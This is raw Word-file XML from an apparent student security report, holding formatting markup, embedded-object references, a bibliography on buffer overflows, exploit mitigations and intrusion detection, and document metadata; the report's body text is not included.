        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1906524242">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1907371171">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1912425148">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1938558641">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1947959068">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1976064568">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1984500027">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2010012105">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2010325208">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2036615845">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2043086832">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2050492382">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2050764338">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2076928488">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2091660604">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2136096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oleObject" Target="embeddings/oleObject4.bin"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject6.bin"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image33.png"/><Relationship Id="rId55"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oleObject" Target="embeddings/oleObject5.bin"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject9.bin"/><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oleObject" Target="embeddings/oleObject2.bin"/><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2.png"/><Relationship Id="rId56"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oleObject" Target="embeddings/oleObject8.bin"/><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oleObject" Target="embeddings/oleObject7.bin"/><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oleObject" Target="embeddings/oleObject3.bin"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image30.png"/><Relationship Id="rId52"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d_m\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Off22</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{0E557EC4-E26E-439B-BDBF-09011C0DF8ED}</b:Guid>
    <b:Title>Why OffSec?</b:Title>
    <b:Year>2022</b:Year>
    <b:Author>
      <b:Author>
        <b:Corporate>Offensive Security</b:Corporate>
      </b:Author>
    </b:Author>
    <b:InternetSiteTitle>offensive-security</b:InternetSiteTitle>
    <b:Month>05</b:Month>
    <b:Day>09</b:Day>
    <b:URL>https://www.offensive-security.com/why-offsec/</b:URL>
    <b:RefOrder>5</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Clo22</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{F78E9633-A566-4FA7-8D02-31995F870523}</b:Guid>
    <b:Author>
      <b:Author>
        <b:Corporate>CloudFlare</b:Corporate>
      </b:Author>
    </b:Author>
    <b:Title>What is buffer overflow?</b:Title>
    <b:InternetSiteTitle>CloudFlare</b:InternetSiteTitle>
    <b:Year>2022</b:Year>
    <b:Month>05</b:Month>
    <b:Day>12</b:Day>
    <b:URL>https://www.cloudflare.com/en-gb/learning/security/threats/buffer-overflow/</b:URL>
    <b:RefOrder>2</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Wan18</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{AEB55219-DEB9-48C6-BD3A-6CB9B821C886}</b:Guid>
    <b:Title>WannaCry cyber-attack cost the NHS £92m after 19,000 appointments were cancelled</b:Title>
    <b:InternetSiteTitle>National Health Executive</b:InternetSiteTitle>
    <b:Year>2018</b:Year>
    <b:Month>10</b:Month>
    <b:Day>12</b:Day>
    <b:URL>https://www.nationalhealthexecutive.com/articles/wannacry-cyber-attack-cost-nhs-ps92m-after-19000-appointments-were-cancelled</b:URL>
    <b:Author>
      <b:Author>
        <b:Corporate>National Health Executive</b:Corporate>
      </b:Author>
    </b:Author>
    <b:RefOrder>1</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>OWA21</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{D9CCDA2E-BAA5-4A9E-9198-F2F161D43997}</b:Guid>
    <b:Author>
      <b:Author>
        <b:Corporate>OWASP</b:Corporate>
      </b:Author>
    </b:Author>
    <b:Title>OWASP Developer Guide</b:Title>
    <b:Year>2021</b:Year>
    <b:InternetSiteTitle>Github</b:InternetSiteTitle>
    <b:Month>04</b:Month>
    <b:Day>29</b:Day>
    <b:URL>https://github.com/OWASP/DevGuide</b:URL>
    <b:RefOrder>3</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Jua18</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{D1681688-069D-454A-A609-625978F8BD44}</b:Guid>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Harán</b:Last>
            <b:First>Juan</b:First>
            <b:Middle>Manuel</b:Middle>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:Title>Malware of the 90s: Remembering the Michelangelo and Melissa viruses</b:Title>
    <b:InternetSiteTitle>We Live Security</b:InternetSiteTitle>
    <b:Year>2018</b:Year>
    <b:Month>11</b:Month>
    <b:Day>12</b:Day>
    <b:URL>https://www.welivesecurity.com/2018/11/12/malware-90s-michelangelo-melissa-viruses/</b:URL>
    <b:RefOrder>6</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Mic21</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{5A19D2E1-8590-4BC9-A2C1-910CE105A3B4}</b:Guid>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Lemmens</b:Last>
            <b:First>Michiel</b:First>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:Title>Stack Canaries – Gingerly Sidestepping the Cage</b:Title>
    <b:InternetSiteTitle>SANS</b:InternetSiteTitle>
    <b:Year>2021</b:Year>
    <b:Month>February</b:Month>
    <b:Day>4</b:Day>
    <b:URL>https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/</b:URL>
    <b:RefOrder>8</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>mei22</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{212730FB-A6F6-4752-9A56-88B2D59B07D6}</b:Guid>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>meir555</b:Last>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:Title>Format String Attack</b:Title>
    <b:InternetSiteTitle>OWASP</b:InternetSiteTitle>
    <b:Year>2022</b:Year>
    <b:Month>05</b:Month>
    <b:Day>12</b:Day>
    <b:URL>https://owasp.org/www-community/attacks/Format_string_attack</b:URL>
    <b:RefOrder>9</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Dow07</b:Tag>
    <b:SourceType>Book</b:SourceType>
    <b:Guid>{24AFFF5D-715C-401E-8CD9-AB6E37CB668A}</b:Guid>
    <b:Title>The Art of Software Security Assessment</b:Title>
    <b:Year>2007</b:Year>
    <b:City>Boston</b:City>
    <b:Publisher>Addison-Wesley</b:Publisher>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Dowd</b:Last>
            <b:First>Mark</b:First>
          </b:Person>
          <b:Person>
            <b:Last>McDonald</b:Last>
            <b:First>John</b:First>
          </b:Person>
          <b:Person>
            <b:Last>Schuh</b:Last>
            <b:First>Justin</b:First>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:RefOrder>7</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Katte</b:Tag>
    <b:SourceType>Report</b:SourceType>
    <b:Guid>{3E192AB3-90F4-4EBC-ADEE-2212AA0A22BD}</b:Guid>
    <b:Title>Whitepaper on Bypassing ASLR/DEP</b:Title>
    <b:Year>no date</b:Year>
    <b:City>New Delhi</b:City>
    <b:Publisher>Secfence Technologies</b:Publisher>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Katoch</b:Last>
            <b:First>Vinay</b:First>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:URL>https://www.exploit-db.com/docs/english/17914-bypassing-aslrdep.pdf</b:URL>
    <b:RefOrder>10</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>mmi06</b:Tag>
    <b:SourceType>Report</b:SourceType>
    <b:Guid>{5B2541C2-8057-4504-B330-D4A9DD8F00D5}</b:Guid>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>mmiller</b:Last>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:Title>Preventing the Exploitation of SEH Overwrites</b:Title>
    <b:Year>2006</b:Year>
    <b:Publisher>ihteam</b:Publisher>
    <b:City>sine loco</b:City>
    <b:RefOrder>11</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>LeBte</b:Tag>
    <b:SourceType>Report</b:SourceType>
    <b:Guid>{7E606354-DB48-438C-9A8A-44D83C37FC5B}</b:Guid>
    <b:Title>Bypassing SEHOP</b:Title>
    <b:Year>no date</b:Year>
    <b:Publisher>Sysdream</b:Publisher>
    <b:City>Levallois-Perret</b:City>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Le Berre</b:Last>
            <b:First>Stéfan</b:First>
          </b:Person>
          <b:Person>
            <b:Last>Cauquil</b:Last>
            <b:First>Damien</b:First>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:RefOrder>12</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Khr19</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{36A83A0B-8A97-4413-9A09-5CB6D35F9C5B}</b:Guid>
    <b:Title>Survey of intrusion detection systems: techniques, datasets and challenges</b:Title>
    <b:Year>2019</b:Year>
    <b:InternetSiteTitle>Springer Link</b:InternetSiteTitle>
    <b:Month>7</b:Month>
    <b:Day>17</b:Day>
    <b:URL>https://link.springer.com/article/10.1186/s42400-019-0038-7</b:URL>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Khraisat</b:Last>
            <b:First>Ansam</b:First>
          </b:Person>
          <b:Person>
            <b:Last>Gondal</b:Last>
            <b:First>Iqbal</b:First>
          </b:Person>
          <b:Person>
            <b:Last>Vamplew</b:Last>
            <b:First>Peter</b:First>
          </b:Person>
          <b:Person>
            <b:Last>Kamruzzaman</b:Last>
            <b:First>Joarder</b:First>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:RefOrder>15</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Wym02</b:Tag>
    <b:SourceType>Report</b:SourceType>
    <b:Guid>{AF1D12DF-9B50-4142-829B-A0F33FBA53C8}</b:Guid>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Wyman</b:Last>
            <b:First>Michael</b:First>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:Title>Intrusion Detection, Evasion, and Trace Analysis</b:Title>
    <b:Year>2002</b:Year>
    <b:URL>https://www.giac.org/paper/gcia/615/intrusion-detection-evasion-trace-analysis/104437</b:URL>
    <b:Publisher>GCIA</b:Publisher>
    <b:City>San Antonio</b:City>
    <b:RefOrder>16</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Pau18</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{75905600-9614-4E46-9D26-0F9B6A8D8191}</b:Guid>
    <b:Title>6 Best Practices to Prevent DDoS Attacks</b:Title>
    <b:Year>2018</b:Year>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Rubens</b:Last>
            <b:First>Paul</b:First>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:InternetSiteTitle>eSecurity Planet</b:InternetSiteTitle>
    <b:Month>7</b:Month>
    <b:Day>2018</b:Day>
    <b:URL>https://www.esecurityplanet.com/networks/how-to-prevent-ddos-attacks-tips-to-keep-your-website-safe/</b:URL>
    <b:RefOrder>17</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Say22</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{5027BE98-2917-4AC0-9C43-265C0E2EDF87}</b:Guid>
    <b:Author>
      <b:Author>
        <b:Corporate>Saylor Academy</b:Corporate>
      </b:Author>
    </b:Author>
    <b:Title>CS406: Information Security - IDS</b:Title>
    <b:InternetSiteTitle>Saylor Academy</b:InternetSiteTitle>
    <b:Year>2022</b:Year>
    <b:Month>05</b:Month>
    <b:Day>13</b:Day>
    <b:URL>https://learn.saylor.org/mod/book/view.php?id=29755&amp;chapterid=5428</b:URL>
    <b:RefOrder>13</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>IMB21</b:Tag>
    <b:SourceType>DocumentFromInternetSite</b:SourceType>
    <b:Guid>{A2230F7E-D04C-413A-ACEE-3449C626F937}</b:Guid>
    <b:Title>Encryption Concepts</b:Title>
    <b:InternetSiteTitle>IBM</b:InternetSiteTitle>
    <b:Year>2021</b:Year>
    <b:Month>03</b:Month>
    <b:Day>03</b:Day>
    <b:URL>https://www.ibm.com/docs/en/ds8870/7.5.0?topic=HW213_7.5.0/com.ibm.storage.ssic.help.doc/f2c_encryption_concepts_3ekm4r.html</b:URL>
    <b:Author>
      <b:Author>
        <b:Corporate>IMB</b:Corporate>
      </b:Author>
    </b:Author>
    <b:RefOrder>14</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Ste21</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{E6B65253-26B2-43B5-BE3D-5BFABD7B41A0}</b:Guid>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Lanaro</b:Last>
            <b:First>Stefano</b:First>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:Title>Steflan Security</b:Title>
    <b:InternetSiteTitle>Complete Guide to Stack Buffer Overflow (OSCP Preparation)</b:InternetSiteTitle>
    <b:Year>2021</b:Year>
    <b:Month>02</b:Month>
    <b:Day>10</b:Day>
    <b:URL>https://steflan-security.com/complete-guide-to-stack-buffer-overflow-oscp/#crashing-the-application</b:URL>
    <b:RefOrder>4</b:RefOrder>
  </b:Source>
</b:Sourc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F80FDD30-B6B5-4134-9890-653695728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2216</TotalTime>
  <Pages>37</Pages>
  <Words>7985</Words>
  <Characters>45520</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UAD</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>53399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Colin M</dc:creator>
  <cp:lastModifiedBy>MIKOLAJ MROZ</cp:lastModifiedBy>
  <cp:revision>40</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-05-08T21:44:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-05-14T08:57:00Z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